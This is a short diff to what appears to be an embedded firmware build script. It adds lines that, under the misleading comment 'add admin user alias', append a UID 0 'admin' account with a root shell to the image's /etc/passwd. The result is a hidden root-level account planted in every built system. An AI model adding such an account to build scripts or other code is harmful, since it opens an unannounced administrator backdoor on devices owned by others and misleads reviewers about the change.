@@ -47,3 +47,6 @@ if [ -r $BOARD_DIR/os.conf ]; then
     done
 fi
 
+# add admin user alias
+echo "admin:x:0:0:root:/root:/bin/sh" >> $TARGET/etc/passwd
+
